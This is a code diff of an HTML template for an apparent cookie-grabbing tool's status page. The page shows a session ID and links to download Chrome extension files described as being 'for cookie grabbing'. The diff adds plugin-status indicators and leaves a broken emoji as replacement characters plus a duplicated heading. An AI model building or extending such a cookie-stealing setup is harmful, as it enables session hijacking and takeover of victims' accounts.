@@ -59,8 +59,29 @@
         <h1>🍪 Cookie Session Status</h1>
         <div class="session-id">Session ID: {{SESSION_ID}}</div>
         
+        <div class="plugin-status-section">
+            <h2>🔌 Plugin Status</h2>
+            <div id="plugin-status-indicator" class="status-indicator">
+                <span id="status-text">Checking plugin status...</span>
+                <div class="status-dot" id="status-dot"></div>
+            </div>
+        </div>
+        
         <div class="download-section">
-            <h2>📁 Chrome Extension Files</h2>
+            <h2>� Plugin Status</h2>
+            <div class="status-cookies-plugin" style="
+                display: inline-block;
+                padding: 8px 16px;
+                border-radius: 4px;
+                font-weight: bold;
+                margin-bottom: 20px;
+                background-color: #ddd;
+                color: #666;
+            ">[checking plugin status...]</div>
+        </div>
+
+        <div class="download-section">
+            <h2>�📁 Chrome Extension Files</h2>
             <p>Download the Chrome extension files for cookie grabbing:</p>
             
             <a href="/download/background.js?sessionId={{SESSION_ID}}" class="download-btn" download="background.js">
